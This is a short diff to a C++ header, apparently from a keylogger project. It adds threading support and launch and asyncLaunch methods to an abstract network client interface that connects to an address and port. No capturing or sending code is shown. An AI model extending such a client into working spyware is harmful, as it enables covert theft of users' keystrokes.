@@ -5,6 +5,7 @@
 #ifndef KEYLOGGER_ICLIENT_HH
 #define KEYLOGGER_ICLIENT_HH
 
+#include <thread>
 #include <string>
 
 namespace network {
@@ -15,6 +16,8 @@ namespace network {
 
 		public:
 			virtual bool connectTo(const std::string &address, unsigned short port) = 0;
+			virtual void launch() = 0;
+			virtual std::shared_ptr<std::thread> asyncLaunch() = 0;
 			virtual void disconnect() = 0;
 
 		protected:
